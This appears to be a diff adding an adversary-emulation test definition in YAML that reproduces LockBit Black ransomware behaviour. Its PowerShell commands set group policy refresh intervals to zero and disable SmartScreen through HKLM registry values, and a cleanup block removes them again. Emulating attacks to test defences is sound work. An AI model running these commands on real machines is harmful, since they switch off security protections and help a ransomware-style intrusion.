@@ -1,0 +1,18 @@
+- id: b1fa41e5-025c-5c3a-a605-68da58cb9b0b
+  name: Soumaia ART Tests - LockBit Black - Modify Group policy settings -Powershell
+  description: An adversary modifies group policy settings (requires elevation)
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1484.001
+    name: 'Domain Policy Modification: Group Policy Modification'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name GroupPolicyRefreshTimeDC -PropertyType DWord -Value 0 -Force
+          New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name GroupPolicyRefreshTimeOffsetDC -PropertyType DWord -Value 0 -Force
+          New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name GroupPolicyRefreshTime -PropertyType DWord -Value 0 -Force
+          New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name GroupPolicyRefreshTimeOffset -PropertyType DWord -Value 0 -Force
+          New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name EnableSmartScreen -PropertyType DWord -Value 0 -Force
+          New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name ShellSmartScreenLevel -Force
+        cleanup: "Remove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeDC -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffsetDC -Force -ErrorAction Ignore \nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTime -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffset -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name EnableSmartScreen -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name ShellSmartScreenLevel -Force -ErrorAction Ignore"
